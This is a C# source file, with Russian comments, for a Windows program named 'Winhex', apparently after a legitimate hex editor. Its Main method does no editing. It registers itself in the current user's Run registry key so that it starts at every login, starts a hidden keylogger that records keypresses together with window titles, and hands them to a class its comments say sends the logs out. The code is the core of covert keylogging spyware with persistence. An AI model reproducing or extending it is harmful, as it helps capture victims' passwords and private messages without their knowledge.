using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Winhex.Interfaces;
using Winhex.Models;

namespace Winhex
{
    static class Program
    {
        private static ILogCreator loger;
        static Program()
        {
            Resolver.RegisterDependencyResolver();
        }
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Автозагрузка
            const string applicationName = "winhex";
            const string pathRegistryKeyStartup =
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            using (RegistryKey registryKeyStartup =
                        Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
            {
                registryKeyStartup.SetValue(
                    applicationName,
                    string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));
            }

            // Начинаем получение нажатых клавиш 
            KeyLogger k = new KeyLogger();
            k.OnKeyPressed += K_OnKeyPressed;

            // объект класса, отправляющего логи
            loger = new UserLogCreator();

            Application.Run();
        }

        private static void K_OnKeyPressed(string title, char sym)
        {
            loger.AddKey(title, sym);
        }
    }
}
